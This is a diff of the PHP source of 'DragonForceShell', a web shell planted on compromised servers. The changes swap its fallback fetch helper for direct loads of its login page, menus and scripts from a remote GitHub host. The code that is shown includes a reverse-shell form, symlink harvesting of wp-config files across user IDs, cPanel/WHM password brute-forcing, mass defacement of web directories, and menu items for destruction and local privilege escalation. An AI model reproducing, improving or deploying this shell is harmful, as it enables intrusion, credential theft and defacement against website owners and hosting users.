@@ -42,34 +42,16 @@ class DFShell{
     static protected $remote_url = "https://raw.githubusercontent.com/Ap0dexMe0/DFS/main/contents";
     
     public function __construct(){
+        $_SESSION['latest'] = $GLOBALS['DFSyntax'][0](self::$remote_url . "/version.txt");
         $_SESSION['need_update'] = false;
-        $_SESSION['latest'] = $GLOBALS['DFShell_Ver'];
-        // v2.3: resilient update check (3s timeout, never fatal if allow_url_fopen off / offline)
-        try{
-            $ctx = stream_context_create(array('http'=>array('timeout'=>3,'user_agent'=>'DFS/2.6')));
-            $ver = @$GLOBALS['DFSyntax'][0](self::$remote_url . "/version.txt", false, $ctx);
-            if($ver!==false && $ver!==""){
-                $ver = trim($ver);
-                $_SESSION['latest'] = $ver;
-                if(doubleval($ver)!==doubleval($GLOBALS['DFShell_Ver'])){
-                    $_SESSION['need_update'] = true;
-                }
-            }
-        }catch(Exception $e){ /* offline = stay quiet */ }
+        if(doubleval($_SESSION['latest'])!==$GLOBALS['DFShell_Ver']){
+            $_SESSION['need_update'] = true;
+        }
     }
 
     // v2.3: central HTML-escape helper (XSS hardening for filenames/paths/cmd output)
     public function DFSH($s){
         return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
-    }
-
-    // v2.3: safe remote fetch with timeout; returns "" instead of false/warning
-    public function DFSFetch($url){
-        try{
-            $ctx = stream_context_create(array('http'=>array('timeout'=>4,'user_agent'=>'DFS/2.3')));
-            $d = @$GLOBALS['DFSyntax'][0]($url, false, $ctx);
-            return ($d===false||$d===null) ? "" : $d;
-        }catch(Exception $e){ return ""; }
     }
 
     // v2.3: recursive delete (fixes massdel/rmdir failing on non-empty dirs)
@@ -932,8 +914,7 @@ class DFShell{
                     if($GLOBALS['DFSPlatform']!=='win'){
                         $saveBase = rtrim($GLOBALS['DFConfig'][1]['path'],'/') ?: '.';
                         if(!file_exists($saveBase.'/sym')) { @mkdir($saveBase.'/sym',0755,true); }
-                        $contents = $this->DFSFetch(self::$remote_url . "/htaccess.txt");
-                        if($contents===""){ $contents = "ReadmeName %{user}%\nOptions Indexes FollowSymLinks\nDirectoryIndex index.html\nAddType text/plain .php\n"; }
+                        $contents = $GLOBALS['DFSyntax'][0](self::$remote_url . "/htaccess.txt");
                         $savedAs = basename($GLOBALS['DFConfig'][1]['dfsaved'] ?: 'wp-config.txt');
                         for ($uid = 0; $uid < 4000; $uid++){ 
                             $nothing = posix_getpwuid($uid);
@@ -958,9 +939,7 @@ class DFShell{
 
             break;
             case "reverse":
-                $raw = $this->DFSFetch(self::$remote_url.'/others.html');
-                $parts = $raw!=="" ? explode('||',$raw) : array();
-                $revhtml = $parts[1] ?? "<form action='' method='POST'><table><tr><td id='reva'><label>Address : </label></td><td><input type='text' name='dfsaddr' placeholder='192.168.1.1'></td></tr><tr><td id='reva'><label>Port : </label></td><td><input type='text' name='dfsport' placeholder='1337'></tr><tr><td></td><td id='revc'><input type='submit' name='dfsrev' value='Reverse'></tr></table></form>";
+                $revhtml = explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[1];
                 echo "<section class='reverse'>";
                 if(!isset($GLOBALS['DFConfig'][1]['dfsrev'])){
                     echo $revhtml;
@@ -1453,8 +1432,7 @@ class DFShell{
                     }
                 }else{
                     if(!isset($GLOBALS['DFConfig'][1]['connect_sql'])){
-                        $raw = $this->DFSFetch(self::$remote_url.'/others.html'); $pp = $raw!==""?explode('||',$raw):array();
-                        echo $pp[4] ?? "<fieldset><center><label>MYSQL CONNECT</label></center><form action='' method='POST'><table><tr><td><label>Host : </label></td><td><input type='text' placeholder='127.0.0.1' name='sqlhost'/></td></tr><tr><td><label>User : </label></td><td><input type='text' placeholder='root' name='sqluser'/></td></tr><tr><td><label>Pass : </label></td><td><input type='text' placeholder='' name='sqlpass'/></td></tr><tr><td><label></label></td><td><input type='submit' value='Connect' name='connect_sql'/></td></tr></table></form></fieldset>";
+                        echo explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[4];
                     }else{
                         $tmp_conn = mysqli_connect($GLOBALS['DFConfig'][1]['sqlhost'],$GLOBALS['DFConfig'][1]['sqluser'],$GLOBALS['DFConfig'][1]['sqlpass']);
                         if(!$tmp_conn){
@@ -1480,8 +1458,7 @@ class DFShell{
             break;
             case "crack":
                 if(!isset($GLOBALS['DFConfig'][1]['crack'])){
-                    $raw = $this->DFSFetch(self::$remote_url.'/others.html'); $pp = $raw!==""?explode('||',$raw):array();
-                    echo $pp[0] ?? "<section class='cracksection'><form action='' method='POST'><table><th>User</th><th>Pass</th><tr><td><textarea name='userlist' required></textarea></td><td><textarea name='passlist' required></textarea></td></tr><tr><td id='crackx'><label>Host : </label><input type='text' name='host' placeholder='target.com' required></td><td id='crackx'><label>Timeout : </label><input type='text' name='timeout' placeholder='0.1' required></td></tr><tr><td id='toright'><input type='radio' name='portc' value='2083' required><label>Cpanel</label></td><td><input type='radio' name='portc' value='2087' required><label>WHM</label></tr></td></table><div id='subcrack'><input type='submit' name='crack' value='Crack' required></div></form></section>";
+                    echo explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[0];
                 }else{
                     $host = $GLOBALS['DFConfig'][1]['host'];
                     $user = explode("\n",$GLOBALS['DFConfig'][1]['userlist']);
@@ -1503,8 +1480,7 @@ class DFShell{
                 $slashtype = $this->DFSSlash();
                 echo "<section class='mass'>";
                 if(!isset($GLOBALS['DFConfig'][1]['dfmass'])){
-                    $raw = $this->DFSFetch(self::$remote_url.'/others.html'); $pp = $raw!==""?explode('||',$raw):array();
-                    echo $pp[2] ?? "<form action='' method='POST'><table><tr><td><label>Code : </label></td><td><textarea name='codemass'></textarea></td></tr><tr><td><label>Remote : </label></td><td><input type='text' name='fromurl' placeholder='https://url/deface.txt'></td></tr><tr><td><label>Filename : </label></td><td><input type='text' name='massname' placeholder='deface.html'></td></tr><tr><td><label>Path : </label></td><td><input type='text' name='masspath' placeholder='/var/www/html/path/'></td></tr><tr><td></td><td><input type='submit' name='dfmass' value='Mass'></td></tr></table></form>";
+                    echo explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[2];
                 }else{
                     $arrpath = glob($GLOBALS['DFConfig'][1]['masspath'] . $slashtype . '*', GLOB_ONLYDIR);
                     
@@ -1512,8 +1488,7 @@ class DFShell{
                     $GLOBALS['DFConfig'][1]['fromurl']!=="" &&
                     $GLOBALS['DFConfig'][1]['fromurl']!==NULL){
                         if(filter_var($GLOBALS['DFConfig'][1]['fromurl'], FILTER_VALIDATE_URL)){
-                            $ncode = $this->DFSFetch($GLOBALS['DFConfig'][1]['fromurl']);
-                            if($ncode===""){ die("<script>alert('Fetch failed — check URL/allow_url_fopen');window.location.replace(window.location.href);</script>"); }
+                            $ncode = file_get_contents($GLOBALS['DFConfig'][1]['fromurl']);
                         }else{
                             die("<script>alert('Check url');window.location.replace(window.location.href);</script>");
                         }
@@ -3333,48 +3308,24 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         return $contents;
     }
     public function DFSAdmin(){
-        // remote template only (test.php style) — GitHub is the source of truth, inline fallback if offline
-        $c = $this->DFSFetch(self::$remote_url . "/login.html");
-        if($c!==""){ return $c; }
-        return "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
-        ."<title>DragonForceShell V2.6 - Login</title><style>"
-        ."body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0d0b00;color:#FFD700;font-family:monospace;margin:0;padding:20px}"
-        .".c{width:100%;max-width:360px;text-align:center;background:#000;border:1px solid #4a3d05;border-radius:14px;padding:28px 24px}"
-        .".b{font-size:24px;letter-spacing:3px;color:#4d7cff}.b span{color:#f70000}h1{font-size:15px;letter-spacing:2px;margin:6px 0 2px}"
-        .".s{font-size:10px;color:#888;margin-bottom:16px;letter-spacing:1px}"
-        ."input[type=password]{width:100%;height:42px;background:#111;border:1px solid #4a3d05;border-radius:8px;color:#FFD700;font-size:16px;padding:0 12px;outline:none}"
-        ."input[type=submit]{width:100%;height:42px;margin-top:12px;border:none;border-radius:8px;background:#2b2470;color:#fff;letter-spacing:3px;cursor:pointer}"
-        ."</style></head><body><div class='c'><div class='b'>DFS <span>V2.6</span></div><h1>DragonForceShell</h1>"
-        ."<p class='s'>RESTRICTED ACCESS</p><form action='' method='POST' autocomplete='off'>"
-        ."<input type='password' name='password' required autofocus placeholder='Password'>"
-        ."<input type='submit' name='login' value='UNLOCK'></form></div></body></html>";
+        $contents = $GLOBALS['DFSyntax'][0](self::$remote_url . "/login.html");
+        return $contents;
     }
     public function DFStart(){
-        // remote templates only (test.php style) — always pull latest UI from GitHub
-        $contents = $this->DFSFetch(self::$remote_url . "/head.html");
-        if(!isset($contents)||$contents===""||$contents===false){ $contents = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>DragonForceShell V2.6 [DFS]</title><script>%{js}%</script><style>%{style}%</style></head><body><div style='text-align:center;color:#4d7cff;letter-spacing:3px'>DFS <span style='color:#f70000'>V2.6</span></div>%{body}%"; }
-        $css = $this->DFSFetch(self::$remote_url . "/dfs.css");
-        if(!isset($css)||$css===""||$css===false){ $css = "body{background:#0d0b00;color:#FFD700;font-family:monospace} a{color:#FFD700}"; }
-        $js = $this->DFSFetch(self::$remote_url . "/script.js");
-        if(!isset($js)||$js===false){ $js = ""; }
-        $contents = preg_replace('/%{style}%/i',$css,$contents);
-        $contents = preg_replace('/%{js}%/i',$js,$contents);
+        $contents = $GLOBALS['DFSyntax'][0](self::$remote_url . "/head.html");
+        $contents = preg_replace('/%{style}%/i',$GLOBALS['DFSyntax'][0](self::$remote_url . "/dfs.css"),$contents); //example
+        $contents = preg_replace('/%{js}%/i',$GLOBALS['DFSyntax'][0](self::$remote_url . "/script.js"),$contents);
         return $contents;
     }
 
     public function DFSBody($location,$pattern,$from){
-        $contents = $this->DFSFetch(self::$remote_url . "/".$location);
-        if(!isset($contents)||$contents===""||$contents===false){
-            // inline fallback nav (only used when GitHub is unreachable)
-            $contents = "<section class=\"bodytop\"><ul><li><a href='%{A1}%'>Directory</a></li><li><a href='%{A2}%'>Config</a></li><li><a href='%{A3}%'>BackConnect</a></li><li><a href='%{A4}%'>Symlink</a></li><li><a href='%{A5}%'>Bruteforce</a></li><li><a href='%{A6}%'>Command</a></li><li><a href='%{A7}%'>Mass</a></li><li><a href='%{A8}%'>Database</a></li><li><a href='%{A9}%'>Destruct</a></li><li><a href='%{A10}%'>Bombing</a></li><li><a href='%{A12}%'>NetScan</a></li><li><a href='%{A13}%'>PortScan</a></li><li><a href='%{A14}%'>Search</a></li><li><a href='%{A15}%'>PHPInfo</a></li><li><a href='%{A16}%'>Auto LPE</a></li><li class='logout'><a href='%{A11}%'>Logout</a></li></ul></section>";
-        }
+        $contents = $GLOBALS['DFSyntax'][0](self::$remote_url . "/".$location);
         $from = $this->DFSRender($pattern,$contents,$from);
         return $from;
     }
 
     public function DFSEnd(){
-        $contents = $this->DFSFetch(self::$remote_url . "/foot.html");
-        if(!isset($contents)||$contents===""||$contents===false){ $contents = "<section class='eagle'><p style='color:#fff;text-align:center'>DragonForceShell V2.6 by EagleEye</p></section>"; }
+        $contents = $GLOBALS['DFSyntax'][0](self::$remote_url . "/foot.html");
         return $contents;
     }
     public function DFSDefault(){
